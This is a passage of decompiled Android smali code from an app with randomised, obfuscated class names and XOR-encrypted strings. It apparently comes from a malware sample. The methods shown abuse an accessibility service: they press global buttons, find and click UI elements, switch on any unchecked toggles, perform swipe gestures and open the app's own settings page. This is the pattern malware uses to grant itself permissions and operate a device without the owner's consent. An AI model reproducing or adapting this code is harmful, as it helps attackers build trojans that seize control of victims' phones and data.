    :cond_0
    return-void
.end method

.method private static I1()V
    .locals 4

    .line 1
    const/4 v0, 0x1

    sput-boolean v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->q:Z

    new-instance v0, Landroid/content/Intent;

    const/16 v1, 0x2d

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v3, v2, [B

    fill-array-data v3, :array_1

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    const/4 v1, 0x7

    new-array v1, v1, [B

    fill-array-data v1, :array_2

    new-array v2, v2, [B

    fill-array-data v2, :array_3

    invoke-static {v1, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    sget-object v2, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-virtual {v2}, Landroid/content/Context;->getPackageName()Ljava/lang/String;

    move-result-object v2

    const/4 v3, 0x0

    invoke-static {v1, v2, v3}, Landroid/net/Uri;->fromParts(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/net/Uri;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;

    const/high16 v1, 0x10000000

    invoke-virtual {v0, v1}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    sget-object v1, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-virtual {v1, v0}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    return-void

    :array_0
    .array-data 1
        0x38t
        0x1t
        0x63t
        -0x23t
        0x55t
        0x34t
        -0x4et
        -0x32t
        0x2at
        0xat
        0x73t
        -0x25t
        0x53t
        0x33t
        -0x4ft
        -0x6dt
        0x77t
        0x2et
        0x57t
        -0x1t
        0x76t
        0x14t
        -0x6bt
        -0x5ft
        0xdt
        0x26t
        0x48t
        -0x1ft
        0x65t
        0x19t
        -0x6dt
        -0x4ct
        0x18t
        0x26t
        0x4bt
        -0x4t
        0x65t
        0xet
        -0x6dt
        -0x4ct
        0xdt
        0x26t
        0x49t
        -0x18t
        0x69t
    .end array-data

    nop

    :array_1
    .array-data 1
        0x59t
        0x6ft
        0x7t
        -0x51t
        0x3at
        0x5dt
        -0x2at
        -0x20t
    .end array-data

    :array_2
    .array-data 1
        -0xet
        -0xbt
        0x4ct
        -0x5ft
        0xft
        0x72t
        0x7dt
    .end array-data

    :array_3
    .array-data 1
        -0x7et
        -0x6ct
        0x2ft
        -0x36t
        0x6et
        0x15t
        0x18t
        -0x4dt
    .end array-data
.end method

.method private static synthetic I2()V
    .locals 2

    .line 1
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    return-void
.end method

.method public static synthetic J()V
    .locals 0

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->J2()V

    return-void
.end method

.method private static J0(I)V
    .locals 9

    .line 1
    invoke-static {}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/a7;->a()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/String;->toLowerCase()Ljava/lang/String;

    move-result-object v0

    const/4 v1, 0x5

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v3, v2, [B

    fill-array-data v3, :array_1

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    const/16 v1, 0x1f4

    const/16 v3, 0xfa

    const/4 v4, 0x0

    if-eqz v0, :cond_7

    const/16 v0, 0x23

    new-array v0, v0, [B

    fill-array-data v0, :array_2

    new-array v2, v2, [B

    fill-array-data v2, :array_3

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->f3(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    if-eqz v0, :cond_6

    invoke-interface {v0}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object p0

    :goto_0
    invoke-interface {p0}, Ljava/util/Iterator;->hasNext()Z

    move-result v0

    if-eqz v0, :cond_b

    invoke-interface {p0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-eqz v0, :cond_4

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    move-result v1

    if-lez v1, :cond_4

    invoke-virtual {v0, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v1

    if-eqz v1, :cond_3

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v2

    if-eqz v2, :cond_3

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v2

    invoke-interface {v2}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v2

    sget-object v5, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->z:[Ljava/lang/String;

    array-length v6, v5

    move v7, v4

    :goto_1
    if-ge v7, v6, :cond_3

    aget-object v8, v5, v7

    invoke-virtual {v2, v8}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v8

    if-eqz v8, :cond_2

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p0

    if-eqz p0, :cond_1

    invoke-virtual {p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object p0

    if-eqz p0, :cond_1

    sget-boolean v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->v:Z

    if-eqz v0, :cond_0

    new-instance v0, Landroid/graphics/Rect;

    invoke-direct {v0}, Landroid/graphics/Rect;-><init>()V

    invoke-virtual {p0, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    invoke-virtual {v0}, Landroid/graphics/Rect;->centerX()I

    move-result p0

    invoke-virtual {v0}, Landroid/graphics/Rect;->centerY()I

    move-result v0

    invoke-static {p0, v0}, Lcom/vknnolqo/p9sv5zvf/MtokN1ft;->z(II)Z

    goto :goto_2

    :cond_0
    const/16 v0, 0x10

    invoke-virtual {p0, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    :goto_2
    invoke-static {v3}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->S0()V

    :cond_1
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V

    goto/16 :goto_6

    :cond_2
    add-int/lit8 v7, v7, 0x1

    goto :goto_1

    :cond_3
    if-eqz v1, :cond_5

    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V

    goto :goto_3

    :cond_4
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->X2()V

    :cond_5
    :goto_3
    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V

    goto :goto_0

    :cond_6
    if-lez p0, :cond_a

    goto :goto_5

    :cond_7
    const/16 v0, 0x2e

    new-array v0, v0, [B

    fill-array-data v0, :array_4

    new-array v5, v2, [B

    fill-array-data v5, :array_5

    invoke-static {v0, v5}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->f3(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    if-eqz v0, :cond_9

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v5

    if-lez v5, :cond_9

    :try_start_0
    invoke-interface {v0, v4}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object p0

    check-cast p0, Landroid/view/accessibility/AccessibilityNodeInfo;

    const/16 v0, 0x27

    new-array v0, v0, [B

    fill-array-data v0, :array_6

    new-array v1, v2, [B

    fill-array-data v1, :array_7

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p0, v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object p0

    if-eqz p0, :cond_8

    invoke-interface {p0}, Ljava/util/List;->size()I

    move-result v0

    if-lez v0, :cond_8

    invoke-interface {p0, v4}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object p0

    check-cast p0, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->I0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    invoke-static {v3}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->S0()V

    goto :goto_6

    :catch_0
    move-exception p0

    goto :goto_4

    :cond_8
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->X2()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_6

    :goto_4
    invoke-virtual {p0}, Ljava/lang/Throwable;->printStackTrace()V

    goto :goto_6

    :cond_9
    if-lez p0, :cond_a

    :goto_5
    add-int/lit8 p0, p0, -0x1

    invoke-static {v1}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    invoke-static {p0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->J0(I)V

    goto :goto_6

    :cond_a
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->X2()V

    :cond_b
    :goto_6
    return-void

    :array_0
    .array-data 1
        0x26t
        -0x4bt
        -0xbt
        0x5ft
        0x47t
    .end array-data

    nop

    :array_1
    .array-data 1
        0x4et
        -0x26t
        -0x65t
        0x30t
        0x35t
        -0x5ft
        0x57t
        0x25t
    .end array-data

    :array_2
    .array-data 1
        0x65t
        -0x3et
        0x76t
        0x14t
        -0x48t
        -0x30t
        0x40t
        -0x9t
        0x69t
        -0x3ct
        0x7ft
        0x14t
        -0x56t
        -0x25t
        0x50t
        -0xft
        0x6ft
        -0x3dt
        0x7ct
        0x49t
        -0x1dt
        -0x29t
        0x40t
        -0x56t
        0x72t
        -0x3ct
        0x6ft
        0x56t
        -0x44t
        -0x1ft
        0x42t
        -0x9t
        0x67t
        -0x40t
        0x7et
    .end array-data

    :array_3
    .array-data 1
        0x6t
        -0x53t
        0x1bt
        0x3at
        -0x27t
        -0x42t
        0x24t
        -0x7bt
    .end array-data

    :array_4
    .array-data 1
        -0x2t
        0x5ct
        -0x5et
        -0x4dt
        -0x76t
        -0x36t
        -0x35t
        -0x16t
        -0x8t
        0x5at
        -0x1ft
        -0x12t
        -0x65t
        -0x34t
        -0x22t
        -0x8t
        -0x10t
        0x5et
        -0x52t
        -0xdt
        -0x7dt
        -0x28t
        -0x31t
        -0x11t
        -0x59t
        0x5at
        -0x55t
        -0x4et
        -0x79t
        -0x2ft
        -0x22t
        -0x11t
        -0x1ct
        0x6ct
        -0x47t
        -0xct
        -0x79t
        -0x38t
        -0xbt
        -0xft
        -0x4t
        0x4at
        -0x60t
        -0x18t
        -0x6at
        -0x75t
    .end array-data

    nop

    :array_5
    .array-data 1
        -0x63t
        0x33t
        -0x31t
        -0x63t
        -0x1et
        -0x41t
        -0x56t
        -0x63t
    .end array-data

    :array_6
    .array-data 1
        -0x6at
        -0x6ft
        0x7t
        0x7dt
        0x3ct
        -0x37t
        0x19t
        0x43t
        -0x70t
        -0x69t
        0x44t
        0x20t
        0x2dt
        -0x31t
        0xct
        0x51t
        -0x68t
        -0x6dt
        0xbt
        0x3dt
        0x35t
        -0x25t
        0x1dt
        0x46t
        -0x31t
        -0x69t
        0xet
        0x7ct
        0x3dt
        -0x21t
        0x17t
        0x5at
        -0x56t
        -0x6et
        0xbt
        0x2at
        0x3bt
        -0x37t
        0xct
    .end array-data

    :array_7
    .array-data 1
        -0xbt
        -0x2t
        0x6at
        0x53t
        0x54t
        -0x44t
        0x78t
        0x34t
    .end array-data
.end method

.method private static J1()V
    .locals 8

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->S2()Landroid/content/Context;

    move-result-object v0

    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/WDvLfaWq;->a()[Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v2}, Lcom/vknnolqo/p9sv5zvf/WDvLfaWq;->c(Landroid/content/Context;[Ljava/lang/String;)Z

    move-result v0

    if-nez v0, :cond_2

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/16 v2, 0x29

    new-array v2, v2, [B

    fill-array-data v2, :array_0

    const/16 v3, 0x8

    new-array v4, v3, [B

    fill-array-data v4, :array_1

    invoke-static {v2, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    if-eqz v0, :cond_0

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->I0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    const/16 v0, 0x1f4

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    :cond_0
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/16 v2, 0x24

    new-array v2, v2, [B

    fill-array-data v2, :array_2

    new-array v3, v3, [B

    fill-array-data v3, :array_3

    invoke-static {v2, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->d(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    if-eqz v0, :cond_1

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v2

    if-lez v2, :cond_1

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v2

    add-int/lit8 v2, v2, -0x1

    invoke-interface {v0, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->I0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    const/16 v0, 0x3e8

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    :cond_1
    const/16 v0, 0x1a

    if-lt v1, v0, :cond_3

    new-instance v2, Landroid/graphics/Path;

    invoke-direct {v2}, Landroid/graphics/Path;-><init>()V

    sget-object v0, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->N:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-static {v0}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/j70;->c(Landroid/content/Context;)I

    move-result v0

    div-int/lit8 v0, v0, 0x2

    int-to-float v0, v0

    sget-object v1, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->N:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    invoke-static {v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/j70;->b(Landroid/content/Context;)I

    move-result v1

    int-to-float v1, v1

    const v3, 0x3f4ccccd    # 0.8f

    mul-float/2addr v3, v1

    invoke-virtual {v2, v0, v3}, Landroid/graphics/Path;->moveTo(FF)V

    const/high16 v3, 0x40800000    # 4.0f

    div-float/2addr v1, v3

    invoke-virtual {v2, v0, v1}, Landroid/graphics/Path;->lineTo(FF)V

    new-instance v0, Landroid/accessibilityservice/GestureDescription$Builder;

    invoke-direct {v0}, Landroid/accessibilityservice/GestureDescription$Builder;-><init>()V

    const-wide/16 v3, 0x1

    const-wide/16 v5, 0x320

    const/4 v7, 0x0

    invoke-static/range {v2 .. v7}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/cm;->a(Landroid/graphics/Path;JJZ)Landroid/accessibilityservice/GestureDescription$StrokeDescription;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/accessibilityservice/GestureDescription$Builder;->addStroke(Landroid/accessibilityservice/GestureDescription$StrokeDescription;)Landroid/accessibilityservice/GestureDescription$Builder;

    invoke-virtual {v0}, Landroid/accessibilityservice/GestureDescription$Builder;->build()Landroid/accessibilityservice/GestureDescription;

    move-result-object v0

    sget-object v1, Lcom/vknnolqo/p9sv5zvf/SM099EXd;->N:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    new-instance v2, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$c;

    invoke-direct {v2}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB$c;-><init>()V

    invoke-static {v1, v0, v2}, Lcom/vknnolqo/p9sv5zvf/TEh82iEU;->f(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Landroid/accessibilityservice/GestureDescription;Lcom/vknnolqo/p9sv5zvf/TEh82iEU$c;)V

    goto :goto_0

    :cond_2
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->n1()V

    :cond_3
    :goto_0
    return-void

    :array_0
    .array-data 1
        0x26t
        0x3dt
        -0x44t
        -0x19t
        -0x41t
        0xat
        0x16t
        -0x4ct
        0x6bt
        0x21t
        -0x4ct
        -0x56t
        -0x59t
        0x11t
        0xat
        -0x57t
        0x3ct
        0x31t
        -0x4ct
        -0x59t
        -0x5at
        0x6t
        0x11t
        -0x19t
        0x2ct
        0x36t
        -0x2t
        -0x58t
        -0x41t
        0x3ct
        0x7t
        -0x48t
        0x31t
        0x33t
        -0x48t
        -0x5bt
        -0x73t
        0x13t
        0x6t
        -0x51t
        0x28t
    .end array-data

    nop

    :array_1
    .array-data 1
        0x45t
        0x52t
        -0x2ft
        -0x37t
        -0x2et
        0x63t
        0x63t
        -0x23t
    .end array-data

    :array_2
    .array-data 1
        -0x7bt
        -0x43t
        -0x6et
        -0x1ft
        -0x33t
        0x5bt
        0x59t
        -0x58t
        -0x38t
        -0x5ft
        -0x66t
        -0x54t
        -0x2bt
        0x40t
        0x45t
        -0x4bt
        -0x61t
        -0x4ft
        -0x66t
        -0x5ft
        -0x2ct
        0x57t
        0x5et
        -0x5t
        -0x71t
        -0x4at
        -0x30t
        -0x52t
        -0x30t
        0x42t
        0x73t
        -0x60t
        -0x6ct
        -0x60t
        -0x70t
        -0x48t
    .end array-data

    :array_3
    .array-data 1
        -0x1at
        -0x2et
        -0x1t
        -0x31t
        -0x60t
        0x32t
        0x2ct
        -0x3ft
    .end array-data
.end method

.method private static synthetic J2()V
    .locals 0

    .line 1
    return-void
.end method

.method public static synthetic K()V
    .locals 0

    .line 1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->i2()V

    return-void
.end method

.method private static K0()V
    .locals 5

    .line 1
    const/16 v0, 0x24

    new-array v0, v0, [B

    fill-array-data v0, :array_0

    const/16 v1, 0x8

    new-array v2, v1, [B

    fill-array-data v2, :array_1

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->f3(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/List;->isEmpty()Z

    move-result v2

    if-eqz v2, :cond_0

    const/16 v0, 0x25

    new-array v0, v0, [B

    fill-array-data v0, :array_2

    new-array v2, v1, [B

    fill-array-data v2, :array_3

    invoke-static {v0, v2}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->f3(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    :cond_0
    if-eqz v0, :cond_4

    const/4 v2, 0x0

    :goto_0
    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v3

    if-ge v2, v3, :cond_3

    invoke-interface {v0, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/view/accessibility/AccessibilityNodeInfo;

    if-eqz v3, :cond_1

    invoke-virtual {v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->isChecked()Z

    move-result v4

    if-nez v4, :cond_2

    invoke-static {v3}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->I0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    const/16 v3, 0x64

    invoke-static {v3}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    goto :goto_1

    :cond_1
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->X2()V

    :cond_2
    :goto_1
    add-int/lit8 v2, v2, 0x1

    goto :goto_0

    :cond_3
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/16 v2, 0x12

    new-array v2, v2, [B

    fill-array-data v2, :array_4

    new-array v1, v1, [B

    fill-array-data v1, :array_5

    invoke-static {v2, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->I0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->x1()V

    goto :goto_2

    :cond_4
    invoke-static {}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->X2()V

    :goto_2
    return-void

    nop

    :array_0
    .array-data 1
        -0x2ft
        -0x4ft
        0x71t
        0x76t
        -0x38t
        0x7at
        0x65t
        0x1at
        -0x29t
        -0x49t
        0x32t
        0x2bt
        -0x27t
        0x7ct
        0x70t
        0x8t
        -0x21t
        -0x4dt
        0x7dt
        0x36t
        -0x3ft
        0x68t
        0x61t
        0x1ft
        -0x78t
        -0x49t
        0x78t
        0x77t
        -0x2dt
        0x78t
        0x6dt
        0x19t
        -0x2ft
        -0x4at
        0x79t
        0x2at
    .end array-data

    :array_1
    .array-data 1
        -0x4et
        -0x22t
        0x1ct
        0x58t
        -0x60t
        0xft
        0x4t
        0x6dt
    .end array-data

    :array_2
    .array-data 1
        -0x55t
        -0x46t
        -0x56t
        0x18t
        0x37t
        -0x20t
        0x38t
        0x1bt
        -0x5at
        -0x46t
        -0x4bt
        0x18t
        0x2ct
        -0x10t
        0x23t
        0x0t
        -0x53t
        -0x48t
        -0x56t
        0x57t
        0x31t
        -0x18t
        0x37t
        0x11t
        -0x46t
        -0x11t
        -0x52t
        0x52t
        0x70t
        -0x6t
        0x27t
        0x1dt
        -0x44t
        -0x4at
        -0x51t
        0x53t
        0x2dt
    .end array-data

    nop

    :array_3
    .array-data 1
        -0x38t
        -0x2bt
        -0x39t
        0x36t
        0x5ft
        -0x77t
        0x50t
        0x74t
    .end array-data

    :array_4
    .array-data 1
        0x2at
        0x6t
        0x5bt
        0x5t
        0x18t
        -0x10t
        0x59t
        0x78t
        0x22t
        0xct
        0x10t
        0x15t
        0x2t
        -0x13t
        0x49t
        0x2dt
        0x25t
        0x59t
    .end array-data

    nop

    :array_5
    .array-data 1
        0x4bt
        0x68t
        0x3ft
        0x77t
        0x77t
        -0x67t
        0x3dt
        0x42t
    .end array-data
.end method

.method private static K1()V
    .locals 5

    .line 1
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/16 v1, 0x27

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    const/16 v2, 0x8

    new-array v3, v2, [B

    fill-array-data v3, :array_1

    invoke-static {v1, v3}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/k70;->b(Lcom/vknnolqo/p9sv5zvf/SM099EXd;Ljava/lang/String;)Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    const/16 v1, 0x1f4

    if-eqz v0, :cond_0

    :goto_0
    invoke-static {v0}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->I0(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    :goto_1
    invoke-static {v1}, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->g3(I)V

    goto :goto_2

    :cond_0
    sget-object v0, Lcom/vknnolqo/p9sv5zvf/JQgPaybB;->a:Lcom/vknnolqo/p9sv5zvf/SM099EXd;

    const/16 v3, 0x2c

    new-array v3, v3, [B

    fill-array-data v3, :array_2

    new-array v4, v2, [B

    fill-array-data v4, :array_3

    invoke-static {v3, v4}, Laabab/b/c/y/i/c/e/i/g/k/l/m/n/o/p/q/aa/bbff/ssss/dd/ff/aa/abbaaaa/fb/c/tt/ii/aaab/sssdsssaaa/ababa/baba/v90;->a([B[B)Ljava/lang/String;

    move-result-object v3

